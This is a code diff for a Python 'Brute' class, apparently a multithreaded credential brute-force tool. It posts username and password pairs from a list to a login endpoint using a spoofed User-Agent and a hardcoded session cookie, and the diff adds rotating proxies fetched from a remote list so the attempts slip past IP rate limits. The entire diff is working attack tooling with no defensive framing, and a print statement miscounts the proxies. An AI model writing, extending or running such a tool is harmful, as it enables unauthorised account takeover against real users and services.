@@ -23,6 +23,8 @@ class Brute(object):
         self.error = 0
         self.projerror = 0
         self.projid = 0
+        self.proxylink = ""
+        self.prlines = []
         self.proxytype = "https"
         self.basename = "log.txt"
         self.proxyname = "proxy.txt"
@@ -38,14 +40,12 @@ class Brute(object):
     def check(self, login, password):
         try:
             
-            if self.proxytype == "burp":
-                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
-            elif self.proxytype == "no":
-                proxies = None
+            pr = self.getproxy()
+            
+            if self.proxytype != "burp":
+                proxies = {'https': self.proxytype +  "://" + pr, 'http': self.proxytype +  "://" + pr}
             else:
-                proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
-            
-            
+                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
             headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36', 'Cookie': 'sh=zUkXIjtaD3D0J_uVCuw8ipiDIGIKo6QzHpXZ2Z5TihpY81fbgZSalO7ELbD8;'}
             body = {'username' : login, 'password': password, 'Nscmd' : 'Nlogin'}
             
@@ -83,16 +83,34 @@ class Brute(object):
         sys.stdout.flush()
 
    
+    def stop(self):
+        self.running = False
+        print("Work ended", end='\r')
+        sys.stdout.flush()
+
+   
 
 
 
     def mult(self):
+        
         with open(self.basename, "r") as tags:
             for line in tags:
                 #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                 self.lines.append(line.strip())
             print('Count of accounts : ' + str(len(self.lines)))  
-            self.count_list = len(self.lines) 
+        self.count_list = len(self.lines) 
+        if "http" in self.proxylink:
+            ptt = threading.Thread(target=self.updateProxyLink)
+            ptt.start()
+            time.sleep(3)
+        else:
+            with open(self.proxyname, "r") as tags:
+                for line in tags:
+                    #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
+                    self.prlines.append(line.strip())
+                print('Count of proxies : ' + str(len(self.lines))) 
+            
         self.startth()
 
     def startth(self):
@@ -100,6 +118,16 @@ class Brute(object):
             t = threading.Thread(target=self.work)
             t.start()
 
+    def updateProxyLink(self):
+        print("updating")
+        while self.running:
+            r = requests.get(self.proxylink, verify=False)
+            
+            self.prlines.clear()
+            for line in r.text.split('\r\n'):
+                self.prlines.append(line)
+            print("prcount "+str(len(self.prlines)))
+            time.sleep(10)
     def work(self):
     #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
         while self.running:
@@ -129,8 +157,7 @@ class Brute(object):
         self.lock.release()
 
     def getproxy(self):
-        proxyfile = open(self.proxyname).read().splitlines()
-        return random.choice(proxyfile)
+        return str(random.choice(self.prlines))
 
     def writelog(self, file, log):
         dirr = self.projectName + "/" + str(self.today.strftime("%m-%d-%H.%M.%S")) + "/" +file
